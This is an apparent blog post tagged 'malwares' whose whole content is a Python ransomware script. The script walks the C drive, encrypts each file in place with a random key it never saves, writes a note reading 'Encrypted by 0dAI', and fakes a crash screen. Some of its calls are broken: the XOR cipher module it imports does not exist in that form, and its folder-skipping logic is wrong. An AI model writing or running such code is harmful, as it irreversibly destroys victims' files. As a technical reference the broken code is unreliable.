---
layout: post
tags: malwares
---

# in python

```python
import os
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import XOR

# Task 1: Enumerate all files on the C drive excluding Windows folders
def enumerate_files():
    c_drive = 'C:'
    for root, dirs, files in os.walk(c_drive):
        # Skip Windows folders and their contents
        if any(dir.lower() == 'windows' for dir in dirs) or not root.startswith(c_drive):
            continue

        for file in files:
            yield os.path.join(root, file)

# Task 2: Encrypt each file using XOR
def encrypt_files(files):
    for file in files:
        try:
            with open(file, 'rb') as f:
                data = f.read()
                key = get_random_bytes(16)  # Random encryption key
                cipher = XOR.new(key)
                encrypted_data = bytes(cipher.update(data)) + cipher.finalize()
                with open(file, 'wb') as f:
                    f.write(encrypted_data)
        except Exception as e:
            print(f"Error encrypting {file}: {e}")

# Task 3: Write a 'note.txt' in the root directory of the C drive with the text "Encrypted by 0dAI"
def write_note():
    with open('C:\\note.txt', 'w') as f:
        f.write("Encrypted by 0dAI")

# Task 4: Display a black screen using Python to simulate a system crash (for demonstration purposes only)
def display_black_screen():
    # This code will not actually create a black screen, it's just for illustrative purposes.
    subprocess.Popen(['powershell.exe', 'Start-Sleep -Seconds 5'], stdout=subprocess.PIPE)

# Combine all tasks into the main function
def main():
    # Task 1: Enumerate files
    for file in enumerate_files():
        print(file)

    # Task 2: Encrypt each file
    encrypt_files(enumerate_files())

    # Task 3: Write a 'note.txt'
    write_note()

    # Task 4: Display a black screen (simulation for demonstration)
    display_black_screen()

if __name__ == "__main__":
    main()
```
